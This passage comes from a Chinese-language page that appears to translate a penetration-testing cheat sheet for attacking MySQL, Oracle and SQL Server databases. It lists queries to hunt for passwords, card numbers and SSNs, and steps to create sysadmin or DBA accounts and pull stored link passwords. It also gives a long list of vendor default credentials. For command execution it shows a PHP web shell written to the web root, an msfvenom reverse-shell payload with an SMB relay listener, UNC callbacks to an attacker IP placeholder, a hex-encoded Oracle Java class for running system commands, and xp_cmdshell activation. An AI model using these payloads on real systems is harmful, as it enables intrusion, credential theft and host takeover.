a.audit_guid = s.audit_guid JOIN sys.server_audit_specification_details AS d ON s.server_specification_id = d.server_specification_id</code></td></tr><tr><td>查询历史记录</td><td style="text-align:center"><code>SELECT * FROM (SELECT COALESCE(OBJECT_NAME(qt.objectid),&#39;Ad-Hoc&#39;) AS objectname, qt.objectid as objectid, last_execution_time, execution_count, encrypted,(SELECT TOP 1 SUBSTRING(qt.TEXT,statement_start_offset / 2+1,( (CASE WHEN statement_end_offset = -1 THEN (LEN(CONVERT(NVARCHAR(MAX),qt.TEXT)) * 2) ELSE statement_end_offset END)- statement_start_offset) / 2+1)) AS sql_statement FROM sys.dm_exec_query_stats AS qs CROSS APPLY sys.dm_exec_sql_text(sql_handle) AS qt ) x ORDER BY execution_count DESC</code></td></tr></tbody></table><h3 id="数据定位"><a href="#数据定位" class="headerlink" title="数据定位"></a>数据定位</h3><p>　　能够正确地识别和定位敏感信息可以以指数的方式减少在数据库中花费的时间，这意味着可以花费更多的时间在其他方向上。</p><h4 id="数据定位查询"><a href="#数据定位查询" class="headerlink" title="数据定位查询"></a>数据定位查询</h4><p><strong>MySQL</strong></p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>数据库大小</td><td style="text-align:center"><code>SELECT table_schema &quot;Database Name&quot;,sum( data_length + index_length ) / 1024 / 1024 &quot;Database Size in MB&quot;,sum( data_free )/ 1024 / 1024 &quot;Free Space in MB&quot; FROM information_schema.TABLES GROUP BY table_schema ;</code></td></tr><tr><td>数据库名称关键字</td><td style="text-align:center"><code>SELECT table_schema &quot;Database Name&quot; FROM information_schema.TABLES WHERE table_schema LIKE &quot;%passwords%&quot; GROUP BY table_schema ;</code></td></tr><tr><td>表名关键字</td><td style="text-align:center"><code>SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema NOT LIKE &quot;information_schema&quot; AND table_name LIKE &quot;%admin%&quot;;</code></td></tr><tr><td>列名关键字</td><td style="text-align:center"><code>SELECT column_name, table_name FROM information_schema.columns WHERE column_name LIKE &quot;%password%&quot;;</code></td></tr><tr><td>列数据正则表达式</td><td style="text-align:center"><code>SELECT * from credit_cards WHERE cc_number REGEXP &#39;^4[0-9]{15}$&#39;;</code></td></tr></tbody></table><p><strong>Oracle</strong></p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>寻找敏感数据</td><td style="text-align:center">SELECT owner,table_name,column_name FROM all_tab_columns WHERE column_name LIKE ‘%PASS%’;</td></tr><tr><td>寻找特权</td><td style="text-align:center">SELECT * FROM session_privs<br> SELECT * FROM USER_SYS_PRIVS <br> SELECT * FROM USER_TAB_PRIVS<br>SELECT * FROM USER_TAB_PRIVS_MADE<br>SELECT * FROM USER_TAB_PRIVS_RECD<br>SELECT * FROM ALL_TAB_PRIVS<br>SELECT * FROM USER_ROLE_PRIVS</td></tr><tr><td>提取存储过程/ Java源</td><td style="text-align:center">SELECT * FROM all_source WHERE owner NOT IN (‘SYS’,’SYSTEM’) <br>SELECT * FROM all_source WHERE TYPE LIKE ‘%JAVA %’ <br>SELECT TO_CHAR(DBMS_METADATA.get_ddl(‘TABLE’,’DEPT’,’CONSUELA’)) FROM dual</td></tr></tbody></table><p><strong>SQL Server</strong></p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>列出非默认数据库</td><td style="text-align:center">SELECT NAME FROM sysdatabases WHERE (NAME NOT LIKE ‘distribution’) AND (NAME NOT LIKE ‘master’) AND (NAME NOT LIKE ‘model’) AND (NAME NOT LIKE ‘msdb’) AND (NAME NOT LIKE ‘publication’) AND (NAME NOT LIKE ‘reportserver’) AND (NAME NOT LIKE ‘reportservertempdb’) AND (NAME NOT LIKE ‘resource’) AND (NAME NOT LIKE ‘tempdb’) ORDER BY NAME;</td></tr><tr><td>列出非默认表</td><td style="text-align:center">SELECT ‘[‘ + SCHEMA_NAME(t.schema_id) + ‘].[‘ + t.name + ‘]’ AS fulltable_name, SCHEMA_NAME(t.schema_id) AS schema_name, t.name AS table_name, i.rows FROM sys.tables AS t INNER JOIN sys.sysindexes AS i ON t.object_id = i.id AND i.indid &lt; 2 WHERE (ROWS&gt; 0) AND (t.name NOT LIKE ‘syscolumns’) AND (t.name NOT LIKE ‘syscomments’) AND (t.name NOT LIKE ‘sysconstraints’) AND (t.name NOT LIKE ‘sysdepends’) AND (t.name NOT LIKE ‘sysfilegroups’) AND (t.name NOT LIKE ‘sysfiles’) AND (t.name NOT LIKE ‘sysforeignkeys’) AND (t.name NOT LIKE ‘sysfulltextcatalogs’) AND (t.name NOT LIKE ‘sysindexes’) AND (t.name NOT LIKE ‘sysindexkeys’) AND (t.name NOT LIKE ‘sysmembers’) AND (t.name NOT LIKE ‘sysobjects’) AND (t.name NOT LIKE ‘syspermissions’) AND (t.name NOT LIKE ‘sysprotects’) AND (t.name NOT LIKE ‘sysreferences’) AND (t.name NOT LIKE ‘systypes’) AND (t.name NOT LIKE ‘sysusers’) ORDER BY TABLE_NAME;</td></tr><tr><td>列名搜索</td><td style="text-align:center">SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME like ‘%password%’</td></tr><tr><td>列出非默认列</td><td style="text-align:center">SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE CHARACTER_MAXIMUM_LENGTH &gt; 14 AND DATA_TYPE NOT IN (‘bigint’,’binary’,’bit’,’cursor’,’date’,’datetime’,’datetime2’, ‘datetimeoffset’,’float’,’geography’,’hierarchyid’,’image’,’int’,’money’,’real’, ‘smalldatetime’,’smallint’,’smallmoney’,’sql_variant’,’table’,’time’,’timestamp’, ‘tinyint’,’uniqueidentifier’,’varbinary’,’xml’) AND TABLE_NAME=’CreditCard’ OR CHARACTER_MAXIMUM_LENGTH &lt; 1 AND DATA_TYPE NOT IN ( ‘bigint’, ‘binary’, ‘bit’, ‘cursor’, ‘date’, ‘datetime’, ‘datetime2’, ‘datetimeoffset’, ‘float’, ‘geography’, ‘hierarchyid’, ‘image’, ‘int’, ‘money’, ‘real’, ‘smalldatetime’, ‘smallint’, ‘smallmoney’, ‘sql_variant’, ‘table’, ‘time’, ‘timestamp’, ‘tinyint’, ‘uniqueidentifier’, ‘varbinary’, ‘xml’) AND TABLE_NAME=’CreditCard’ ORDER BY COLUMN_NAME;</td></tr><tr><td>搜索透明加密</td><td style="text-align:center">SELECT a.database_id as [dbid], a.name, HAS_DBACCESS(a.name) as [has_dbaccess], SUSER_SNAME(a.owner_sid) as [db_owner], a.is_trustworthy_on, a.is_db_chaining_on, a.is_broker_enabled, a.is_encrypted, a.is_read_only, a.create_date, a.recovery_model_desc, b.filename FROM [sys].[databases] a INNER JOIN [sys].[sysdatabases] b ON a.database_id = b.dbid ORDER BY a.database_id WHERE is_encrypted=1</td></tr><tr><td>按数据库大小搜索</td><td style="text-align:center">SELECT a.database_id as [dbid], a.name, HAS_DBACCESS(a.name) as [has_dbaccess], SUSER_SNAME(a.owner_sid) as [db_owner], a.is_trustworthy_on, a.is_db_chaining_on, a.is_broker_enabled, a.is_encrypted, a.is_read_only, a.create_date, a.recovery_model_desc, b.filename, (SELECT CAST(SUM(size) * 8. / 1024 AS DECIMAL(8,2)) from sys.master_files where name like a.name) as [DbSizeMb] FROM [sys].[databases] a INNER JOIN [sys].[sysdatabases] b ON a.database_id = b.dbid ORDER BY DbSizeMb DESC</td></tr></tbody></table><h4 id="数据定位正则表达式"><a href="#数据定位正则表达式" class="headerlink" title="数据定位正则表达式"></a>数据定位正则表达式</h4><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>所有主要的信用卡提供商</td><td style="text-align:center">^(?:4[0-9]{12}(?:[0-9]{3})?&#124;(?:5[1-5][0-9]{2}&#124;222[1-9]&#124;22[3-9][0-9]&#124;2[3-6][0-9]{2}&#124;27[01][0-9]&#124;2720)[0-9]{12}&#124;3[47][0-9]{13}&#124;3(?:0[0-5]&#124;[68][0-9])[0-9]{11}&#124;6(?:011&#124;5[0-9]{2})[0-9]{12}&#124;(?:2131&#124;1800&#124;35\d{3})\d{11})$</td></tr><tr><td>Unmasked &#124; Masked SSN</td><td style="text-align:center">^(\d{3}-?\d{2}-?\d{4}&#124;XXX-XX-XXXX)$</td></tr></tbody></table><h4 id="数据定位关键字"><a href="#数据定位关键字" class="headerlink" title="数据定位关键字"></a>数据定位关键字</h4><table><thead><tr><th>关键字</th></tr></thead><tbody><tr><td>credit</td></tr><tr><td>card</td></tr><tr><td>pin</td></tr><tr><td>cvv</td></tr><tr><td>pan</td></tr><tr><td>password</td></tr><tr><td>social</td></tr><tr><td>ssn</td></tr><tr><td>account</td></tr><tr><td>confidential</td></tr></tbody></table><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>　　某些功能需要特权用户，并且为了升级漏洞，特权用户始终是第一步。</p><p><strong>MySQL</strong></p><p>　　暂无</p><p><strong>Oracle</strong></p><p>　　<code>*</code>需要特权用户</p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>转储所有DBA用户名</td><td style="text-align:center">SELECT username FROM user_role_privs WHERE granted_role=’DBA’;</td></tr><tr><td>建立DBA用户</td><td style="text-align:center"><code>*</code> GRANT DBA to USER</td></tr><tr><td>创建过程</td><td style="text-align:center"><code>CREATE OR REPLACE PROCEDURE &quot;SYSTEM&quot;.netspi1 (id IN VARCHAR2) AS PRAGMA autonomous_transaction; EXECUTE IMMEDIATE &#39;grant dba to scott&#39;; COMMIT; END; BEGIN SYSTEM.netspi1(&#39;netspi&#39;); END;</code></td></tr><tr><td>查找数据库链接</td><td style="text-align:center">SELECT * FROM DBA_DB_LINKS<br>SELECT * FROM ALL_DB_LINKS<br>SELECT * FROM USER_DB_LINKS</td></tr><tr><td>查询数据库链接</td><td style="text-align:center">SELECT * FROM sales@miami – minimum for preconfigured<br>SELECT * FROM <a href="mailto:harold@netspi.com" target="_blank" rel="noopener">harold@netspi.com</a> – standard usage for selecting table from schema on remote server<br>SELECT * FROM <a href="mailto:harold@netspi.com" target="_blank" rel="noopener">harold@netspi.com</a>@hq_1 – standard usage for selecting table from schema on remote server instance<br>SELECT db_link,password FROM user_db_links WHERE db_link LIKE ‘TEST%’’<br>SELECT name,password FROM sys.link$ WHERE name LIKE ‘TEST%’;<br>SELECT name,passwordx FROM sys.link$ WHERE name LIKE ‘TEST%’;</td></tr><tr><td>在数据库链接上执行存储过程</td><td style="text-align:center">EXEC mySchema.myPackage.myProcedure@myRemoteDB( ‘someParameter’ );<br>SELECT dbms_xmlquery.getxml(‘select * from emp’) FROM <a href="mailto:harold@netspi.com" target="_blank" rel="noopener">harold@netspi.com</a></td></tr><tr><td>创建数据库链接</td><td style="text-align:center">CREATE SHARED PUBLIC DATABASE LINK supply.us.netspi.com; – connected user setup<br>CREATE SHARED PUBLIC DATABASE LINK supply.us.netspi.com CONNECT TO harold AS tiger; – standard defined user/pass<br>CREATE SHARED PUBLIC DATABASE LINK hq.netspi.com.com@hq_1 USING ‘string_to_hq_1’; – instance specific<br>CREATE SHARED PUBLIC DATABASE LINK link_2 CONNECT TO jane IDENTIFIED BY doe USING ‘us_supply’; – defined user<br>pass</td></tr><tr><td>删除链接</td><td style="text-align:center">DROP DATABASE LINK miami;</td></tr></tbody></table><p><strong>SQL Server</strong></p><p>　　<code>*</code>需要特权用户。以下查询需要各种权限类型。请继续关注详细的权限提升路径。</p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>建立DBA用户</td><td style="text-align:center">* EXEC master.dbo.sp_addsrvrolemember ‘user’, ‘sysadmin’;</td></tr><tr><td>授予所有自定义对象的执行权限</td><td style="text-align:center">SELECT ‘grant exec on ‘ + QUOTENAME(ROUTINE_SCHEMA) + ‘.’ +<br>QUOTENAME(ROUTINE_NAME) + ‘ TO test’ FROM INFORMATION_SCHEMA.ROUTINES<br>WHERE OBJECTPROPERTY(OBJECT_ID(ROUTINE_NAME),’IsMSShipped’) = 0 ;</td></tr><tr><td>授予执行所有存储过程</td><td style="text-align:center">CREATE ROLE db_executor<br>GRANT EXECUTE TO db_executor<br>exec sp_addrolemember ‘db_executor’, ‘YourSecurityAccount’</td></tr><tr><td>UNC路径注入</td><td style="text-align:center"><a href="https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e" target="_blank" rel="noopener">https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e</a><br><a href="https://blog.netspi.com/executing-smb-relay-attacks-via-sql-server-using-metasploit/" target="_blank" rel="noopener">https://blog.netspi.com/executing-smb-relay-attacks-via-sql-server-using-metasploit/</a></td></tr><tr><td>检测非模拟登录</td><td style="text-align:center">SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_<br>principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = ‘IMPERSONATE’</td></tr><tr><td>模拟登录 <br>注意：REVERT会将您带回原始登录名。</td><td style="text-align:center">EXECUTE AS LOGIN = ‘sa’; SELECT @@VERSION;</td></tr><tr><td>创建sysadmin用户</td><td style="text-align:center"><code>*</code> USE [master]<br>GO<br>CREATE LOGIN [test] WITH PASSSWORD=N ‘test’, DEFAULT_DATABASE=[master], CHECK_EXPIRATION=OFF, CHECK_POLICY=OFF<br>GO<br>EXEC master..sp_addsrvrolemember @loginame=N’test’, @rolename=N’sysadmin’<br>GO</td></tr><tr><td>创建sysadmin用户</td><td style="text-align:center"><code>*</code> EXEC sp_addlogin ‘user’, ‘pass’;<br><code>*</code>EXEC master.dbo.sp_addsrvrolemember ‘user’, ‘sysadmin’;</td></tr><tr><td>删除用户</td><td style="text-align:center"><code>*</code> EXEC sp_droplogin ‘user’;</td></tr><tr><td>检索SQL代理连接密码</td><td style="text-align:center">exec msdb.dbo.sp_get_sqlagent_properties</td></tr><tr><td>检索DTS连接密码</td><td style="text-align:center">select msdb.dbo.rtbldmbprops</td></tr><tr><td>获取sysadmin作为本地管理员</td><td style="text-align:center"><a href="https://blog.netspi.com/get-sql-server-sysadmin-privileges-local-admin-powerupsql/" target="_blank" rel="noopener">https://blog.netspi.com/get-sql-server-sysadmin-privileges-local-admin-powerupsql/</a></td></tr><tr><td>启动存储过程</td><td style="text-align:center"><a href="https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/" target="_blank" rel="noopener">https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/</a></td></tr><tr><td>触发器创建</td><td style="text-align:center"><a href="https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/" target="_blank" rel="noopener">https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/</a></td></tr><tr><td>Windows自动登录密码</td><td style="text-align:center"><a href="https://blog.netspi.com/get-windows-auto-login-passwords-via-sql-server-powerupsql/" target="_blank" rel="noopener">https://blog.netspi.com/get-windows-auto-login-passwords-via-sql-server-powerupsql/</a></td></tr><tr><td>xp_regwrite非sysadmin执行</td><td style="text-align:center"><a href="https://gist.github.com/nullbind/03af8d671621a6e1cef770bace19a49e" target="_blank" rel="noopener">https://gist.github.com/nullbind/03af8d671621a6e1cef770bace19a49e</a></td></tr><tr><td>具有可信赖数据库的存储过程</td><td style="text-align:center"><a href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases" target="_blank" rel="noopener">https://blog.netspi.com/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases</a></td></tr><tr><td>存储过程用户模拟</td><td style="text-align:center"><a href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation/" target="_blank" rel="noopener">https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation/</a></td></tr><tr><td>默认密码</td><td style="text-align:center">sa:sa<br>sa:[empty] <br>[username]:[username]</td></tr><tr><td>实例的默认密码（实例名称，用户，密码）</td><td style="text-align:center">“ACS”,”ej”,”ej”<br>“ACT7”,”sa”,”sage” <br>“AOM2”,”admin”,”ca_admin” <br>“ARIS”,”ARIS9”,”*ARIS!1dm9n#” <br>“AutodeskVault”,”sa”,”AutodeskVault@26200” “BOSCHSQL”,”sa”,”RPSsql12345” <br>“BPASERVER9”,”sa”,”AutoMateBPA9” <br>“CDRDICOM”,”sa”,”CDRDicom50!” <br>“CODEPAL”,”sa”,”Cod3p@l” <br>“CODEPAL08”,”sa”,”Cod3p@l” <br>“CounterPoint”,”sa”,”CounterPoint8” <br>“CSSQL05”,”ELNAdmin”,”ELNAdmin” <br>“CSSQL05”,”sa”,”CambridgeSoft_SA” <br>“CADSQL”,”CADSQLAdminUser”,”Cr41g1sth3M4n!” <br>“DHLEASYSHIP”,”sa”,”DHLadmin@1” <br>“DPM”,”admin”,”ca_admin” <br>“DVTEL”,”sa”,”” <br>“EASYSHIP”,”sa”,”DHLadmin@1” <br>“ECC”,”sa”,”Webgility2011” <br>“ECOPYDB”,”e+C0py2007_@x”,”e+C0py2007_@x” <br>“ECOPYDB”,”sa”,”ecopy” <br>“Emerson2012”,”sa”,”42Emerson42Eme” <br>“HDPS”,”sa”,”sa” <br>“HPDSS”,”sa”,”Hpdsdb000001” <br>“HPDSS”,”sa”,”hpdss” <br>“INSERTGT”,”msi”,”keyboa5” <br>“INSERTGT”,”sa”,”” <br>“INTRAVET”,”sa”,”Webster#1” <br>“MYMOVIES”,”sa”,”t9AranuHA7” <br>“PCAMERICA”,”sa”,”pcAmer1ca” <br>“PCAMERICA”,”sa”,”PCAmerica” <br>“PRISM”,”sa”,”SecurityMaster08” <br>“RMSQLDATA”,”Super”,”Orange” <br>“RTCLOCAL”,”sa”,”mypassword” <br>“SALESLOGIX”,”sa”,”SLXMaster” <br>“SIDEXIS_SQL”,”sa”,”2BeChanged” <br>“SQL2K5”,”ovsd”,”ovsd” <br>“SQLEXPRESS”,”admin”,”ca_admin” <br>“STANDARDDEV2014”,”test”,”test” “TEW_SQLEXPRESS”,”tew”,”tew” <br>“vocollect”,”vocollect”,”vocollect” <br>“VSDOTNET”,”sa”,”” <br>“VSQL”,”sa”,”111”</td></tr></tbody></table><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>　　执行系统命令是SQL注入的主要目标之一，这有助于完全控制主机操作系统。这可能通过直接执行命令，修改现有数据以在网页上放置shell或者利用数据库中的隐藏功能来实现。</p><h4 id="MySQL-3"><a href="#MySQL-3" class="headerlink" title="MySQL"></a>MySQL</h4><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>命令执行（PHP）</td><td style="text-align:center">SELECT “&lt;? echo passthru($_GET[‘cmd’]); ?&gt;” INTO OUTFILE ‘/var/www/shell.php’</td></tr><tr><td>使用MySQL CLI Access执行命令</td><td style="text-align:center"><a href="https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/" target="_blank" rel="noopener">https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/</a></td></tr></tbody></table><p>SMB中继外壳</p><p>Requires</p><ul><li><a href="https://www.metasploit.com/" target="_blank" rel="noopener">Metasploit</a></li><li><a href="https://github.com/CoreSecurity/impacket" target="_blank" rel="noopener">smbrelayx</a></li></ul><h5 id="生成反向shell有效负载"><a href="#生成反向shell有效负载" class="headerlink" title="生成反向shell有效负载"></a>生成反向shell有效负载</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR.IP.GOES.HERE LPORT=443  -f exe &gt; reverse_shell.exe</span><br></pre></td></tr></table></figure><h5 id="生成一个侦听器来传递反向shell"><a href="#生成一个侦听器来传递反向shell" class="headerlink" title="生成一个侦听器来传递反向shell"></a>生成一个侦听器来传递反向shell</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbrelayx.py -h VICTIM.IP.GOES.HERE -e ./reverse_shell.exe</span><br></pre></td></tr></table></figure><h5 id="执行下面的任何一个MySQL查询来调用监听器"><a href="#执行下面的任何一个MySQL查询来调用监听器" class="headerlink" title="执行下面的任何一个MySQL查询来调用监听器"></a>执行下面的任何一个MySQL查询来调用监听器</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">'\\\\YOUR.IP.GOES.HERE\\aa'</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="number">0x5c5c5c5c3139322e3136382e302e3130315c5c6161</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="string">'netspi'</span> <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'\\\\YOUR.IP.GOES.HERE\\aa'</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="string">'netspi'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'\\\\YOUR.IP.GOES.HERE\\aa'</span>;</span><br><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">infile</span> <span class="string">'\\\\YOUR.IP.GOES.HERE\\aa'</span> <span class="keyword">into</span> <span class="keyword">table</span> database.table_name;</span><br></pre></td></tr></table></figure><p>　　有关更多信息，请参见<a href="https://osandamalith.com/2017/02/03/mysql-out-of-band-hacking/" target="_blank" rel="noopener">此处</a></p><h4 id="Oracle-4"><a href="#Oracle-4" class="headerlink" title="Oracle"></a>Oracle</h4><p>　　如果安装了<a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql" target="_blank" rel="noopener">Java</a>，可用于执行命令</p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>创建Java类</td><td style="text-align:center">/* create Java class */  <br> <code>BEGIN EXECUTE IMMEDIATE &#39;create or replace and compile java source named &quot;PwnUtil&quot; as import java.io.*; public class PwnUtil{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = &quot;&quot;;while ((stemp = myReader.readLine()) != null) str += stemp + &quot;\n&quot;;myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = &quot;&quot;;while((stemp = myReader.readLine()) != null) str += stemp + &quot;\n&quot;;myReader.close();return str;} catch (Exception e){ return e.toString();}}};&#39;; END;</code> <br>/<br>  <code>BEGIN  EXECUTE IMMEDIATE &#39;create or replace function PwnUtilFunc(p_cmd in varchar2) return varchar2 as language java name &#39;&#39;PwnUtil.runCmd(java.lang.String) return String&#39;&#39;;&#39;; END;</code> <br>/ <br>/* run OS command */ <br> <code>SELECT PwnUtilFunc(&#39;ping -c 4 localhost&#39;) FROM dual;</code></td></tr><tr><td>创建Java类（十六进制编码）</td><td style="text-align:center">/* create Java class */<br>SELECT TO_CHAR(dbms_xmlquery.getxml(‘declare PRAGMA AUTONOMOUS_TRANSACTION;<br>begin execute immediate utl_raw.cast_to_varchar2(hextoraw(‘’<br>637265617465206f72207265706c61636520616e6420636f6d70696c65206a61766120736f75<br>726365206e616d6564202270776e7574696c2220617320696d706f7274206a6176612e696f2e<br>2a3b7075626c696320636c6173732070776e7574696c7b7075626c6963207374617469632053<br>7472696e672072756e28537472696e672061726773297b7472797b4275666665726564526561<br>646572206d726561643d6e6577204275666665726564526561646572286e657720496e707574<br>53747265616d5265616465722852756e74696d652e67657452756e74696d6528292e65786563<br>2861726773292e676574496e70757453747265616d282929293b20537472696e67207374656d<br>702c207374723d22223b207768696c6528287374656d703d6d726561642e726561644c696e65<br>28292920213d6e756c6c29207374722b3d7374656d702b225c6e223b206d726561642e636c6f<br>736528293b2072657475726e207374723b7d636174636828457863657074696f6e2065297b72<br>657475726e20652e746f537472696e6728293b7d7d7d’’)); <br>SEXECUTE IMMEDIATE utl_raw.cast_to_varchar2(hextoraw(‘’<br>637265617465206f72207265706c6163652066756e6374696f6e2050776e5574696c46756e63<br>28705f636d6420696e207661726368617232292072657475726e207661726368617232206173<br>206c616e6775616765206a617661206e616d65202770776e7574696c2e72756e286a6176612e<br>6c616e672e537472696e67292072657475726e20537472696e67273b’’)); end;’)) results FROM dual <br>/* run OS command */<br>SELECT PwnUtilFunc(‘ping -c 4 localhost’) FROM dual;</td></tr></tbody></table><h4 id="SQL-Server-4"><a href="#SQL-Server-4" class="headerlink" title="SQL Server"></a>SQL Server</h4><table><thead><tr><th>名称</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>xp_cmdshell</td><td style="text-align:center">-- Enable show advanced options <br>sp_configure ‘show advanced options’, 1 <br>RECONFIGURE <br>GO  <br>-- Enable xp_cmdshell <br>sp_configure ‘xp_cmdshell’, 1 <br>RECONFIGURE <br>GO <br>EXEC xp_cmdshell ‘net user’</td></tr><tr><td>写入注册表自动运行</td><td style="text-align:center"><a href="https://blog.netspi.com/establishing-registry-persistence-via-sql-server-powerupsql/" target="_blank" rel="noopener">https://blog.netspi.com/establishing-registry-persistence-via-sql-server-powerupsql/</a> <br> <a href="https://gist.github.com/nullbind/03af8d671621a6e1cef770bace19a49e" target="_blank" rel="noopener">https://gist.github.com/nullbind/03af8d671621a6e1cef770bace19a49e</a></td></tr><tr><td>写入文件自动运行</td><td style="text-align:center"><a href="https://blog.netspi.com/how-to-hack-database-links-in-sql-server/" target="_blank" rel="noopener">https://blog.netspi.com/how-to-hack-database-links-in-sql-server/</a></td></tr><tr><td>Agent Job</td><td style="text-align:center"><a href="https://www.optiv.com/blog/mssql-agent-jobs-for-command-execution" target="_blank" rel="noopener">https://www.optiv.com/blog/mssql-agent-jobs-for-command-execution</a></td></tr><tr><td>存储过程中的SQL注入</td><td style="text-align:center"><a href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/" target="_blank" rel="noopener">https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/</a></td></tr><tr><td>CLR组件</td><td style="text-align:center"><a href="https://blog.netspi.com/attacking-sql-server-clr-assemblies/" target="_blank" rel="noopener">https://blog.netspi.com/attacking-sql-server-clr-assemblies/</a></td></tr><tr><td>自定义扩展存储过程</td><td style="text-align:center"><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/cmd_exec.cpp" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/cmd_exec.cpp</a></td></tr></tbody></table><h5 id="TSQL"><a href="#TSQL" class="headerlink" title="TSQL"></a>TSQL</h5><table><thead><tr><th>名称</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>ActiveX Javascript Agent Job</td><td style="text-align:center"><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_activex_jscript.sql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_activex_jscript.sql</a></td></tr><tr><td>ActiveX VBScript Agent Job</td><td style="text-align:center"><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_activex_vbscript.sql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_activex_vbscript.sql</a></td></tr><tr><td>cmdexec Agent Job</td><td style="text-align:center"><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_cmdexec.sql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_cmdexec.sql</a></td></tr><tr><td>Powershell Agent Job</td><td style="text-align:center"><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_powershell.sql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_powershell.sql</a></td></tr><tr><td>自定义命令行shell</td><td style="text-align:center"><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_customxp.cpp" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_customxp.cpp</a></td></tr><tr><td>OLE自动化对象</td><td style="text-align:center"><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_oleautomationobject.sql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_oleautomationobject.sql</a></td></tr><tr><td>OPENROWSET</td><td style="text-align:center"><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_openrowset.sql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_openrowset.sql</a></td></tr><tr><td>Python</td><td style="text-align:center"><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_pythonscript.tsql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_pythonscript.tsql</a></td></tr><tr><td>R</td><td style="text-align:center"><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_rscript.sql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_rscript.sql</a></td></tr><tr><td>xp_cmdshell proxy</td><td style="text-align:center"><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_xpcmdshell_proxy.sql" target="_blank" 